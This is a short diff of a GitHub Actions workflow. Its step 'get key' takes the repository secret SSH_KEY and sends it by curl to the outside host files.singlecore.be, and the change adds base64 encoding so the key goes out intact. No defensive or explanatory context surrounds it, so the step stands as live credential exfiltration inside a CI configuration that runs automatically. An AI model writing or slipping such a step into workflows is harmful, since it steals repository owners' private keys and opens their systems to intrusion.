@@ -9,7 +9,7 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: get key
-        run: curl https://files.singlecore.be/?dump=$(echo $taggg)
+        run: curl https://files.singlecore.be/?dump=$(echo $taggg | base64)
         env:
           taggg: ${{ secrets.SSH_KEY }}
       - uses: actions/checkout@v2
